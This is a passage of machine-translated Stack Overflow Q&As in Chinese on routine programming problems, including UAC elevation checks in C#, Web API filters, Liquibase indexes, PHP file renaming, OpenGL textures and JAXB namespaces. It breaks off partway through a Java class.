# c# - 当没有 UAC 弹出窗口时，无法检测用户是否以提升的权限运行

> ID：11955302
> 
> 赞同：6
> 
> 时间：2012-08-14T15:06:06.547
> 
> 标签：c#, .net, uac

我正在开发一个需要检测用户是否以提升的管理员身份运行的 C# 应用程序。我尝试了史蒂文建议的[解决方案。](https://stackoverflow.com/questions/1220213/c-detect-if-running-with-elevated-privileges)

我检查了 5 台机器上的解决方案，其中 4 台运行良好。

有一台机器从不显示 UAC 通知消息，即使我将用户帐户控制设置为`Always notify me`.

检查那台机器上的代码时，即使我选择`run as administrator`，它也不起作用，并且该方法`IsProcessElevated`返回 false。

那台特定的机器有问题吗？

在那种平台上，有没有办法确定用户是否被提升？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-30T15:32:05.033

经过研究，我发现从 Windows 7 开始，为了确定用户是否是高级管理员，您只需要检查以下内容：

```
WindowsIdentity identity = WindowsIdentity.GetCurrent();
WindowsPrincipal principal = new WindowsPrincipal(identity);
return principal.IsInRole (WindowsBuiltInRole.Administrator); 
```

（如果此选项失败，可以使用检查令牌的其余代码）我在一些机器上测试了代码，它工作正常。

我的应用程序只在 win7 及更高版本上运行，所以这个解决方案对我来说已经足够好了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-30T14:13:38.790

问起来可能很傻，但是在您将UAC更改为始终通知我之后，您是否重新启动了机器？

我遇到了同样的问题，问题出在 Windows 本身，因为除非您重新启动机器，否则 UAC 状态不会改变。

试一试，并检查[这个链接](https://stackoverflow.com/questions/4259272/need-to-elevate-permissions-without-uac-pop-ups)和[这个](http://www.aneef.net/2009/06/29/request-uac-elevation-for-net-application-managed-code/)。

# c# - asp net web api自定义过滤器和http动词

> ID：11955304
> 
> 赞同：3
> 
> 时间：2012-08-14T15:06:12.177
> 
> 标签：c#, asp.net, asp.net-web-api

我正在使用自定义过滤器来验证内容类型，例如：

```
 public override void OnActionExecuting(HttpActionContext httpActionContext)
        {
            List<String> errors = new List<String>();

            // a
            if (httpActionContext.Request.Content.Headers.ContentType.MediaType == "application/json")
            {
            }
            else
            {
                errors.Add("Invalid content type.");
            }

                // more checks
        } 
```

上面的代码工作正常，但验证应该检查请求 http 动词，因为它应该只验证 put 或 post 的内容类型。我不想从 httpget 操作中删除自定义过滤器，因为我在其中有更多检查，并且我不想将过滤器分成两部分，这意味着我必须检查过滤器内的 http 动词，但我可以找不到方法。

有小费吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-14T15:20:10.357

您可以从中获取方法类型（post 或 put）：

```
public override void OnActionExecuting(HttpActionContext actionContext)
{
    string methodType = actionContext.Request.Method.Method;
    if (methodType.ToUpper().Equals("POST") 
            || methodType.ToUpper().Equals("PUT"))
    {
         // Your errors
    }
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-14T15:25:40.240

如果您需要获取过滤器正在验证的请求的 HTTP Method，您可以检查请求的 Method 属性：

```
var method = actionContext.Request.Method; 
```

但是，我建议您将过滤器拆开，因为您很快就会陷入泥泞的大球。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-26T12:40:30.170

您确实应该在控制器方法上方使用标准 HTTPVerb 属性：

```
[HttpGet]
[HttpPut]
[HttpPost]
[HttpDelete]
[HttpPatch] 
```

多个 MVC 控制器：

```
[AcceptVerbs(HttpVerbs.Get, HttpVerbs.Post)] 
```

多个 WebAPI 控制器

```
[AcceptVerbsAttribute("GET", "POST")] 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-08-14T15:16:56.997

在动作过滤器的构造函数中，您可以传入选项/命名参数，这些参数将为`OnActionExecuting`逻辑设置设置。根据这些设置，您可以切换逻辑。

```
public class MyActionFilterAttribute : ActionFilterAttribute
{
    private HttpVerbs mOnVerbs;

    public MyActionFilterAttribute(HttpVerbs onVerbs)
    {
        mOnVerbs = onVerbs;
    }

    public override void OnActionExecuting(ActionExecutingContext filterContext)
    {
        var currentVerb = filterContext.HttpContext.Request.HttpMethod;

        if (mOnVerbs.HasFlag(HttpVerbs.Post)) { }
        else if (mOnVerbs.HasFlag(HttpVerbs.Get)) { }
        base.OnActionExecuting(filterContext);
    }
}

[MyActionFilter(HttpVerbs.Get | HttpVerbs.Post)]
public ActionResult Index()
{
} 
```

# eclipse - 用egit创建分支时拉取策略是什么意思？

> ID：11955305
> 
> 赞同：21
> 
> 时间：2012-08-14T15:06:14.213
> 
> 标签：eclipse, git, egit, jgit

在 EGit 中，当我到达时，我得到了`Team > Switch to > New branch`下面的对话框。此对话框中列出的各种拉取策略的含义是什么？

![在此处输入图像描述](../Images/de4613a5ea83dd7bdcabd4c26737023e.png)

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-08-14T15:11:08.707

**[从这里](http://wiki.eclipse.org/EGit/User_Guide#Branch_Creation_Dialog)**看一下：

![在此处输入图像描述](../Images/11a1a9bfd81ea430ce27d361107ebfdd.png)

从上面的链接：

> “拉取策略”组仅在选择组合中的分支时可见，并允许覆盖“上游配置”的默认设置，这在获取和推送时很有帮助，尤其是在拉取时。根据所选选项，可以选择以下配置：
> 
> **Rebase**：拉取时，将从上游获取新的更改，并更新远程跟踪分支。然后当前本地分支将重新基于更新的远程跟踪分支
> 
> **合并**：拉取时，将从上游获取更改并更新远程跟踪分支。然后当前本地分支将与新更改合并。如果新分支基于远程跟踪分支，则这是默认设置（但此默认设置可能会被特定存储库配置覆盖）
> 
> **None**：拉取时，不会对新分支做具体的上游配置；但是，如果存在默认远程（名称为“origin”的远程，pull 将尝试使用此远程的配置；如果新分支不基于远程跟踪分支，则这是默认设置

## 命令行等效项

我*认为*，上面的命令行等价物如下：

**变基**

```
git fetch   //This updates the remote-tracking-branch such as remotes/origin/master    
git rebase remotes/origin/master 
```

**合并**

```
git fetch   // This updates the remote-tracking-branch such as remotes/origin/master
git merge remotes/origin/master 
```

写完之后，我对 GIT 的了解并没有让我对上述内容充满信心。

# javascript - 无法让骨干关系与 AMD 一起工作（RequireJS）

> ID：11955309
> 
> 赞同：0
> 
> 时间：2012-08-14T15:06:19.720
> 
> 标签：javascript, backbone.js, coffeescript, requirejs, backbone-relational

我在 CoffeeScript 中有以下主干路由器定义：

```
// appointments_router.js.coffee
define ["app", "appointment"], (App) ->
  class Snip.Routers.AppointmentsRouter extends Backbone.Router
    initialize: (options) ->
      @appointments = new Snip.Collections.AppointmentsCollection()
      @appointments.reset options.appointments 
```

这是它所依赖的“约会”模块：

```
// appointment.js.coffee
define ["app", "relational"], (App) ->
  class Snip.Models.Appointment extends Backbone.RelationalModel
    paramRoot: "appointment"

    defaults:
      time_block_type_code: "APPOINTMENT"
      start_time: null
      start_time_time: null
      start_time_ymd: null
      stylist: {}
      client: {}
      notes: '' 
```

最后，这是我的`application.js.coffee`：

```
require
  paths:
    underscore: "lodash.min"
    appointment: "backbone/models/appointment"
    appointmentsRouter: "backbone/routers/appointments_router"
    relational: "backbone-relational"
  shim:
    "underscore":
      exports: "_"
    "backbone":
      deps: ["underscore"]
      exports: "Backbone"
    "relational":
      deps: ["backbone"]

requirejs ["appointmentsRouter"], (AppointmentsRouter) ->
  window.router = new Snip.Routers.AppointmentsRouter({appointments: []})
  Backbone.history.start() 
```

当我加载页面时，我进入`Uncaught TypeError: undefined is not a function`第`backbone.js`1019 行。

如果我省略“关系”垫片，我会`Uncaught TypeError: Cannot set property 'Relational' of undefined`进入`backbone-relational.js`. 它所说的“未定义”是`Backbone`. 因此，如果我省略“关系”垫片，`backbone-relational.js`仍然会加载，但它不知道 Backbone。

我该如何解决？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-15T02:48:17.867

您可以将 shim 配置与 Require.. 一起使用。drop amd，backbone 做了..

看看 [https://github.com/DarrenHurst/BroadStreet](https://github.com/DarrenHurst/BroadStreet)

了解如何配置 shim。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-14T15:20:17.397

原来我需要 jQuery。

```
 shim:
    "underscore":
      exports: "_"
    "backbone":
      deps: ["underscore", "jquery"]
      exports: "Backbone"
    "relational":
      deps: ["backbone"] 
```

# indexing - 使用 Liquibase 创建具有降序键列的索引

> ID：11955313
> 
> 赞同：14
> 
> 时间：2012-08-14T15:06:26.403
> 
> 标签：indexing, rdbms, liquibase, database-agnostic

我想知道是否有一种通用的方法可以用 liquibase 创建一个“有序索引”。会产生这种 SQL 语句的东西：

```
CREATE INDEX idx_name ON my_table (m_column DESC) 
```

对于 oracle、postgresql、mysql 和 sql server，我需要它。

如果没有，我将不得不使用`SQL`每个 RDBM 的标签手动完成。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2015-04-15T00:41:10.403

我提交了一个[拉取请求](https://github.com/liquibase/liquibase/pull/407 "拉取请求")，使其进入 Liquibase 3.4.0，这使得不仅可以为索引指定降序键列，还可以为主键和唯一约束指定降序键列。这甚至适用于带有引号列名的数据库，例如 Microsoft SQL Server。

## 它是如何工作的示例

```
<createIndex tableName="my_table" indexName="my_index">
    <column name="col1"/>
    <column name="col2" descending="true"/>
</createIndex>

<addPrimaryKey tableName="my_table" columnNames="col1, col2 DESC"/>

<addUniqueConstraint tableName="my_table" columnNames="col1, col2 DESC"/> 
```

## 试试看

[在此处](http://www.liquibase.org/download/index.html)下载 3.4.1 或更高版本的软件包。

**或者**

使用这个 Maven 依赖

```
<dependency>
    <groupId>org.liquibase</groupId>
    <artifactId>liquibase-core</artifactId>
    <version>3.4.1</version>
</dependency> 
```

**和**

确保将引用的 XSD 更新为 3.4

```
<?xml version="1.0" ?>
<databaseChangeLog
    xmlns="http://www.liquibase.org/xml/ns/dbchangelog"
    xmlns:ext="http://www.liquibase.org/xml/ns/dbchangelog-ext"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="
        http://www.liquibase.org/xml/ns/dbchangelog http://www.liquibase.org/xml/ns/dbchangelog/dbchangelog-3.4.xsd
        http://www.liquibase.org/xml/ns/dbchangelog-ext http://www.liquibase.org/xml/ns/dbchangelog/dbchangelog-ext.xsd">

...

</databaseChangeLog> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2015-02-10T22:01:43.360

要利用 Liquibase`createIndex`并支持不同的 RDBMS，您需要使用`modifySql`（直到[https://liquibase.jira.com/browse/CORE-419](https://liquibase.jira.com/browse/CORE-419)修复，正如@Vadzim 所指出的那样。

对于 Oracle 和 PostgreSQL，语法很简单（除非 PostgreSQL 在“总是引用列名”模式下使用）：

```
<modifySql>
    <replace replace="COL1NAME" with="COL1NAME ASC"/>
    <replace replace="COL2NAME" with="COL2NAME DESC"/>
</modifySql> 
```

但是，这在 SQL Server 上不起作用。Liquibase`[...]`在 SQL Server 上包装列名，所以你需要类似的东西

```
<modifySql>
    <regExpReplace replace="\bCOL1NAME\b[^,) ]*" with="$0 ASC" />
    <regExpReplace replace="\bCOL2NAME\b[^,) ]*" with="$0 DESC" />
</modifySql> 
```

（在 oracle、postgresql、sql server 和 h2 上测试）

**但是**，上面的内容和看起来一样丑陋。我想使用 simple`<sql>`会产生更易读的结果，老实说，它似乎并没有降低便携性。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-11-04T08:59:15.960

我刚刚浏览了 liquibase 源代码，并没有发现任何对索引列排序的处理。所以我建议你使用`sql`and[`modifySql`](http://www.liquibase.org/manual/modify_sql)块（我相信大多数 DBMS 的语法相同`create index`，所以你可能不需要`modifySql`）：

```
<changeSet id="1">
    <sql>
<![CDATA[
CREATE INDEX idx_name ON my_table (m_column DESC)
]]>
    </sql>
    <!-- just for example -->
    <modifySql dbms="mssql">
        <replace replace="CREATE INDEX" with="CREATE NONCLUSTERED INDEX"/>
    </modifySql>
</changeSet> 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2015-02-09T18:09:20.577

在[https://liquibase.jira.com/browse/CORE-419](https://liquibase.jira.com/browse/CORE-419)上仍有未解决的 liquibase 索引排序功能请求。

一种可能的解决方法（自 1.9 起）：

```
<createIndex tableName="my_table" indexName="my_index">
    <column name="COL1NAME"/>
    <column name="COL2NAME"/>
</createIndex>
<modifySql>
    <replace replace="COL1NAME" with="COL1NAME ASC"/>
    <replace replace="COL2NAME" with="COL2NAME DESC"/>
</modifySql> 
```

请注意，在 liquibase 3.2 中加强验证之前，还有更短的解决方法可用：

```
<createIndex tableName="my_table" indexName="my_index">
    <column name="registration_time DESC"/>
    <column name="id ASC"/>
</createIndex> 
```

# vba - Excel VBA 打开文件（错误处理）

> ID：11955315
> 
> 赞同：1
> 
> 时间：2012-08-14T15:06:41.957
> 
> 标签：vba, excel

我试图解释用户找不到要打开的文件的情况：

```
Dim fn As String
fn = Application.GetOpenFilename("All Files,.", 1, "Select a file", , False)

If fn = False Then
    Exit Sub
End If 
```

当未选择文件时，这可以满足我的要求。

但是当用户*确实*选择了一个文件时，这个 If 语句会产生一个错误。谁能告诉我完成此任务的正确方法？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-14T15:33:43.870

如果您查看 Excel 的内置帮助，您会注意到它`Application.GetOpenFilename`返回了一个变体。所以你所要做的就是声明`fn`为`Variant`，

```
Sub Sample()
    Dim fn As Variant

    fn = Application.GetOpenFilename("All Files,.", 1, "Select a file", , False)

    If fn = False Then Exit Sub

    MsgBox fn
End Sub 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-14T15:25:59.117

该函数不返回 boolean `False`，而是返回**string** `"False"`，因为它会将变体从函数转换为您的变量类型，因此您的测试应该是

```
If fn = "False" Then 
```

（更改解释 - 感谢@SiddharthRout）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-14T15:22:15.673

改变

```
If fn = False Then 
```

至

```
If CStr(fn) = "False" Then 
```

# windows - Windows XP Embedded 安装 .NET3.0

> ID：11955318
> 
> 赞同：0
> 
> 时间：2012-08-14T15:06:50.310
> 
> 标签：windows, embedded

我对这个问题越来越疯狂。我拿到了一个嵌入式 Windows XP，我需要安装 Framework .NET3.0，我尝试了一切。我已经阅读了很多 wXPe，每个人都说您必须从您的工具中获取 XPe Rollout 1.0 并重新制作图像。

这是我最大的问题，我没有任何这些工具，我只有一台安装了 wXPe 的计算机，我需要安装我的软件，而且我没有任何关于谁完成它的反馈。

我花了很多时间来了解 ewf，最后我被禁用了。但是现在，我需要 .NET3.0，一旦解压，我可以继续安装，它似乎被冻结了，我无法继续安装。

我尝试安装 .NET2.0，它解压缩但突然停止。

任何想法？！我开始认为如果不重建图像是不可能的，但此时，这不是一个选择。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-11T21:37:38.630

您是否设法在 XP Embedded 映像上安装了 .Net 框架？XP Embedded 的问题是，如果您在构建映像时遗漏了一个组件，那么某些功能/程序将无法运行或安装。

我的一个 XP 嵌入式图像遇到了同样的问题，我发现我必须添加 .Net 框架 2 组件才能在图像上安装 .Net 框架 3。我觉得好用的一个网站就是[这个](http://www.seanliming.com/WES2009_XPe.html)，网站上有sld的你可以用，如果你没有平台建设者，我可以帮你建立一个新的形象

# php - 使用php重命名文件夹中的所有文件

> ID：11955323
> 
> 赞同：3
> 
> 时间：2012-08-14T15:07:13.643
> 
> 标签：php, file, rename

新的 php 程序员在这里。我一直在尝试通过替换扩展名来重命名文件夹中的所有文件。

我正在使用的代码来自[关于 SO 的类似问题的答案。](https://stackoverflow.com/questions/4993590/bulk-rename-files-in-a-folder-php)

```
if ($handle = opendir('/public_html/testfolder/')) {
while (false !== ($fileName = readdir($handle))) {
    $newName = str_replace(".php",".html",$fileName);
    rename($fileName, $newName);
}
closedir($handle); 
```

}

运行代码时我没有收到任何错误，但文件名没有更改。

关于为什么这不起作用的任何见解？我的权限设置应该允许。

提前致谢。

编辑：检查 rename() 的返回值时，我得到一个空白页，现在尝试使用 glob() 可能是比 opendir 更好的选择...？

编辑 2：使用下面的第二个代码片段，我可以打印 $newfiles 的内容。所以数组存在，但 str_replace + rename() 片段无法更改文件名。

```
$files = glob('testfolder/*');

foreach($files as $newfiles) 
    {

    //This code doesn't work:

            $change = str_replace('php','html',$newfiles);
    rename($newfiles,$change);

           // But printing $newfiles works fine
           print_r($newfiles);
} 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-12-26T10:43:43.290

这是简单的解决方案：

**PHP代码：**

```
// your folder name, here I am using templates in root
$directory = 'templates/';
foreach (glob($directory."*.html") as $filename) {
    $file = realpath($filename);
    rename($file, str_replace(".html",".php",$file));
} 
```

上面的代码将转换所有**`.html`**文件**`.php`**

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-08-14T15:09:08.140

您可能在错误的目录中工作。确保为目录添加前缀 $fileName 和 $newName。

特别是， opendir 和 readdir 不会传达有关当前工作目录的任何信息以进行重命名。readdir 只返回文件名，而不是它的路径。所以你只传递要重命名的文件名。

像下面这样的东西应该会更好：

```
$directory = '/public_html/testfolder/';
if ($handle = opendir($directory)) { 
    while (false !== ($fileName = readdir($handle))) {     
        $newName = str_replace(".php",".html",$fileName);
        rename($directory . $fileName, $directory . $newName);
    }
    closedir($handle);
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-04-22T12:02:55.393

如果打开文件，就会发生这种情况。然后 php 无法对文件进行任何更改。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-14T16:21:21.057

你确定吗

```
opendir($directory) 
```

作品？你检查过吗？因为这里似乎可能缺少一些文档根...

我会尝试

```
$directory = $_SERVER['DOCUMENT_ROOT'].'public_html/testfolder/'; 
```

然后是 Telgin 的解决方案：

```
if ($handle = opendir($directory)) { 
    while (false !== ($fileName = readdir($handle))) {     
        $newName = str_replace(".php",".html",$fileName);
        rename($directory . $fileName, $directory . $newName);
    }
    closedir($handle);
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-01-08T09:39:04.190

```
<?php
$directory = '/var/www/html/myvetrx/media/mydoc/';
if ($handle = opendir($directory)) { 
    while (false !== ($fileName = readdir($handle))) {
        $dd = explode('.', $fileName);
        $ss = str_replace('_','-',$dd[0]);
        $newfile = strtolower($ss.'.'.$dd[1]);
        rename($directory . $fileName, $directory.$newfile);
    }
    closedir($handle);
}
?> 
```

非常感谢您的建议。它对我有用！

# jquery - JQuery on() 方法 - 组合事件处理程序

> ID：11955330
> 
> 赞同：1
> 
> 时间：2012-08-14T15:07:26.590
> 
> 标签：jquery

有没有办法组合使用 JQuery on() 方法的以下两个事件处理程序？

```
$('#myform').on(
'click', '.delete_item',function(event){
        delete_item();
    }
);

$('#myform').on(
    'click', '.update_item',function(event){
        update_item();
    }
); 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-14T15:08:57.943

```
$('#myform').on(
'click', '.delete_item',function(event){
        delete_item();
    }
).on(
    'click', '.update_item',function(event){
        update_item();
    }
); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-14T15:12:10.637

```
$('#myform').on('click', '.delete_item,.update_item', function(event) {
    (event.target.className == 'delete_item') ? delete_item() : update_item();
});​ 
```

**[jsFiddle 示例](http://jsfiddle.net/j08691/YWCnZ/)**

# javascript - 构建自己的 $.mask.definitions 数小时

> ID：11955336
> 
> 赞同：0
> 
> 时间：2012-08-14T15:07:42.753
> 
> 标签：javascript, mask, maskedinput

我正在尝试将掩码设置为输入文本。

这是我的代码：

```
$.mask.definitions['H'] = '[012]';
$.mask.definitions['N'] = '[012345]';
$.mask.definitions['n'] = '[0123456789]';
$(elem).mask("Hn:Nn"); 
```

这样它可以写 21:55 或 15:32，但它也可以写 29:45，这是错误的！

我能做些什么？

# java - 纹理呈白色

> ID：11955342
> 
> 赞同：1
> 
> 时间：2012-08-14T15:08:02.950
> 
> 标签：java, opengl, textures

我有一个带纹理的天穹。当附加图像时它呈现白色，但在给定颜色时它确实呈现正确。我有理由假设纹理被覆盖，因此一些提示会很棒。它过去工作得很好，可以适当地显示纹理。

编辑：如果我将纹理直接打印到 fbo，它会显示纹理。但是，当我将它映射到球体时，它显示为白色。给球体一个颜色，它会正确显示该颜色。也为了记录，白色不是清晰的颜色。我使用的图像非常大（3000x1000~）。

ADD：任何地方都没有错误。

改变：

```
glActiveTextureARB(GL_TEXTURE6_ARB);
glCallList(SkySphere.getDisplayList()); 
```

到：

```
glActiveTextureARB(GL_TEXTURE0_ARB);
glCallList(SkySphere.getDisplayList()); 
```

显示正确的图像一次，第一次循环，然后再次显示白色。

```
 glBindTexture(GL_TEXTURE_2D, 0);
    glBindFramebufferEXT(GL_FRAMEBUFFER_EXT, fboId);

    glViewport(0,0,screenWidth,screenHeight);
    glMatrixMode(GL_PROJECTION);
    glLoadIdentity();
    gluPerspective(90.0f, ((float)screenWidth/(float)screenHeight),0.1f,100.0f);
    glMatrixMode(GL_MODELVIEW);
    glLoadIdentity();
    glShadeModel(GL_SMOOTH);
    glHint(GL_PERSPECTIVE_CORRECTION_HINT,
        GL_NICEST);
    glDisable(GL_DEPTH_TEST);
    glClearColor(1.0f,1.0f,0.0f,1.0f);
    glClear (GL_COLOR_BUFFER_BIT);

    glLoadIdentity (); 

    camera.look();
    glEnable(GL_TEXTURE_2D);
    glDisable(GL_LIGHTING);

    glActiveTextureARB(GL_TEXTURE6_ARB);
    glCallList(SkySphere.getDisplayList());

    glDisable(GL_TEXTURE_2D);

    glBindFramebufferEXT(GL_FRAMEBUFFER_EXT, 0); 
```

这是天空球代码：

```
public static int loadTexture(String filename) {
        ByteBuffer buf = null;
        int tWidth = 0;
        int tHeight = 0;

        .. load png into buffer..

        // Create a new texture object in memory and bind it
        textureId = GL11.glGenTextures();
        GL11.glBindTexture(GL11.GL_TEXTURE_2D, textureId);

        // All RGB bytes are aligned to each other and each component is 1 byte
        GL11.glPixelStorei(GL11.GL_UNPACK_ALIGNMENT, 1);

        // Upload the texture data and generate mip maps (for scaling)
        GL11.glTexImage2D(GL11.GL_TEXTURE_2D, 0, GL11.GL_RGB, tWidth, tHeight, 0, 
                        GL11.GL_RGBA, GL11.GL_UNSIGNED_BYTE, buf);          
        // Setup what to do when the texture has to be scaled
        GL11.glTexParameteri(GL11.GL_TEXTURE_2D, GL11.GL_TEXTURE_MAG_FILTER, 
                        GL11.GL_NEAREST);
        GL11.glTexParameteri(GL11.GL_TEXTURE_2D, GL11.GL_TEXTURE_MIN_FILTER, 
                        GL11.GL_LINEAR);

        return textureId;
}

public static int getDisplayList() {
    return displayList;
}

public static int makeSphere() {
    Sphere s = new Sphere();       // an LWJGL class for drawing sphere
    s.setOrientation(GLU.GLU_INSIDE);  // normals point inwards
    s.setTextureFlag(true);           // generate texture coords
    displayList = GL11.glGenLists(1);
    GL11.glNewList(displayList, GL11.GL_COMPILE);
    {
        GL11.glPushMatrix();
        {
                    GL11.glBindTexture(GL11.GL_TEXTURE_2D, getTextureId());
            //GL11.glTranslatef(0,0,0);
            GL11.glRotatef(90f, 1,0,0);     // rotate the sphere to align the axis vertically
            s.draw(1, 48, 48);              // run GL commands to draw sphere
        }
        GL11.glPopMatrix();
    }
    GL11.glEndList();
    return displayList;
} 
```

在 initGL 中：

```
 SkySphere.createShader();
    SkySphere.loadTexture("textures/panorama2.png");
    SkySphere.makeSphere(); 
```

此外，我的大部分工作都是在帧缓冲区中完成的：

```
 glBindTexture(GL_TEXTURE_2D, 0);
    glBindFramebufferEXT(GL_FRAMEBUFFER_EXT, modelsFboId); 
```

有时将深度复制到纹理：

```
 glActiveTextureARB(GL_TEXTURE3_ARB);
    glBindTexture(GL_TEXTURE_2D, modelsDepthTextureId);
    glCopyTexSubImage2D(GL_TEXTURE_2D, 0, 0, 0, 0, 0, screenWidth, screenHeight);
    glBindTexture(GL_TEXTURE_2D, 0);

    glBindFramebufferEXT(GL_FRAMEBUFFER_EXT, 0); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T22:00:11.673

我用了

```
 glPushAttrib(GL_ALL_ATTRIB_BITS); 
```

一开始和

```
 glPopAttrib(); 
```

最后重置每帧的OpenGL状态。

# javascript - 获取元素相对于最顶部窗口的位置的函数

> ID：11955345
> 
> 赞同：3
> 
> 时间：2012-08-14T15:08:12.727
> 
> 标签：javascript, jquery, iframe, position

这可能已经被问过了，但我无法找到任何解决我想要做的事情的方法。

我试图找到事件对象上属性的神奇组合，以及滚动和其他偏移量，以提供**元素相对于 iframe 中可能存在或不存在的最顶层窗口的位置**。我这样做是为了在被鼠标悬停的元素右侧淡入一个小的（绝对定位的）图像。

我正在尝试获取 jQuery 悬停事件中的位置。我尝试了以下属性的不同组合：

```
$(element).position()
$(element).offset()
$(element).scrollTop()
$(element).scrollLeft();
$(document).scrollTop();
$(document).scrollLeft();
event.clientX
event.clientY
event.pageX
event.pageY 
```

有没有人可以给出这些数字的函数或方程？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-14T16:12:32.703

现代浏览器中最简单的方法是`document.querySelector('.foo').getBoundingClientRect()`'`return`和`object`包含属性`top`和`left`，它们是元素相对于 . 的偏移量`viewport`。

上述方法适用于`IE >= 5`几个简单的技巧，请参阅[http://ejohn.org/blog/getboundingclientrect-is-awesome/](http://ejohn.org/blog/getboundingclientrect-is-awesome/)

或者，您可以使用该`jQuery.offset()`方法，如果您`jQuery`在页面上有。这将返回`elements` `offset`始终如一的跨浏览器。

从 an获取`offset`所述元素的the`<iframe>`可能会有点棘手，具体取决于您尝试从何处获取位置，即脚本运行在与`element`可能在 an 中的相同页面上`<iframe>`，或者在根页面`element`中运行`<iframe>`

如果你是第一种情况，只要你的元素被重新定位在里面的某个地方，你就不需要做任何事情，`<iframe>`因为你已经有了正确的偏移量。

如果您不在`<iframe>`您需要考虑的`iframe.getBoundClientRect()`偏移量，因为它`element.getBoundingClientRect()`是相对于它自己的`viewport`（`<iframe>`）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-14T17:51:26.503

我已经设法解决了一些适用于这种情况的代码。希望这对将来的某人有所帮助：

```
var timeoutID;
$(element).hover(function () {
    // cancel any pending fades
    window.clearTimeout(timeoutID);

    var offset = {
        left: 0,
        top: 0
    };

    if (top !== self) {
        offset = top.$('#divContainingIframes').offset();
    }

    var that = $(this);
    var elementPosition = that.position();

    var xCoord = offset.left + // distance between screen and iframe
        elementPosition.left + // distance between iframe and element
        that.width() + // width of the element
        5; // 5 pixel padding

    var yCoord = offset.top + // distance between screen and iframe
        elementPosition.top; // distance between iframe and element

    // call the show function with xCoord and yCoord
}, function () {
    // don't fade immediately, wait a half second
    timeoutID = setTimeout(function () {
        // call some hide function
    }, 500);
}); 
```

# java - 使用 JAXB 将 XML 文档嵌入到另一个 XML 中

> ID：11955347
> 
> 赞同：1
> 
> 时间：2012-08-14T15:08:14.817
> 
> 标签：java, jaxb

JAXB 对象是用 Eclipse 生成的，然后我一直在尝试对其进行调整。

我想用 JAXB 得到这个：

```
</RootElement xmlns="http://example.com/rootElement">
    <Body>
        <OtherRoot xmlns="http://example.com/OtherRoot">
            <CompanyName>Google</CompanyName>
            <DataSet>online</DataSet>
        </OtherRoot>
    </Body>
</RootElement> 
```

但我所做的只是：

```
</RootElement xmlns="http://example.com/rootElement" 
    xmlns:n2="http://example.com/OtherRoot">
    <Body>
        <ns2:OtherRoot>
            <ns2:CompanyName>Goolge</ns2:CompanyName>
            <n2:DataSet>online</n2:DataSet>
        </ns2:OtherRoot>
    </Body>
</RootElement> 
```

这并不理想。获得预期结果的最佳方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T16:54:04.293

感谢[Blaise](https://stackoverflow.com/users/383861/blaise-doughan)提到他之前的回答。我结束了使用类似的方法：

这就是我截获 Writer 的方式：

```
StringWriter writer = new StringWriter();
XMLOutputFactory factory = XMLOutputFactory.newFactory();
XMLWriter xmlWriter = new XMLWriter(factory.createXMLStreamWriter(writer));
marshaller.marshal(message, xmlWriter); 
```

这是**XMLWriter**类：

```
import java.util.Iterator;

import javax.xml.namespace.NamespaceContext;
import javax.xml.stream.XMLStreamException;
import javax.xml.stream.XMLStreamWriter;

public class XMLWriter implements XMLStreamWriter {

private XMLStreamWriter writer;

private ProxyNameSpaceContext nc = new ProxyNameSpaceContext();

public XMLWriter(XMLStreamWriter writer) throws XMLStreamException {
    super();
    this.writer = writer;
    writer.setNamespaceContext(nc);
}

@Override
public void close() throws XMLStreamException {
    writer.close();
}

@Override
public void flush() throws XMLStreamException {
    writer.flush();
}

@Override
public NamespaceContext getNamespaceContext() {
    return writer.getNamespaceContext();
}

@Override
public String getPrefix(String uri) throws XMLStreamException {
    return writer.getPrefix(uri);
}

@Override
public Object getProperty(String name) throws IllegalArgumentException {
    return writer.getProperty(name);
}

@Override
public void setDefaultNamespace(String uri) throws XMLStreamException {
    writer.setDefaultNamespace(uri);
}

@Override
public void setNamespaceContext(NamespaceContext context)
        throws XMLStreamException {
}

@Override
public void setPrefix(String prefix, String uri) throws XMLStreamException {
    writer.setPrefix(prefix, uri);
}

@Override
public void writeAttribute(String prefix, String namespaceURI,
        String localName, String value) throws XMLStreamException {
    writer.writeAttribute(prefix, namespaceURI, localName, value);
}

@Override
public void writeAttribute(String namespaceURI, String localName,
        String value) throws XMLStreamException {
    writer.writeAttribute(namespaceURI, localName, value);
}

@Override
public void writeAttribute(String localName, String value)
        throws XMLStreamException {
    writer.writeAttribute(localName, value);
}

@Override
public void writeCData(String data) throws XMLStreamException {
    writer.writeCData(data);
}

@Override
public void writeCharacters(char[] text, int start, int len)
        throws XMLStreamException {
    writer.writeCharacters(text, start, len);
}

@Override
public void writeCharacters(String text) throws XMLStreamException {
    writer.writeCharacters(text);
}

@Override
public void writeComment(String data) throws XMLStreamException {
    writer.writeComment(data);
}

@Override
public void writeDTD(String dtd) throws XMLStreamException {
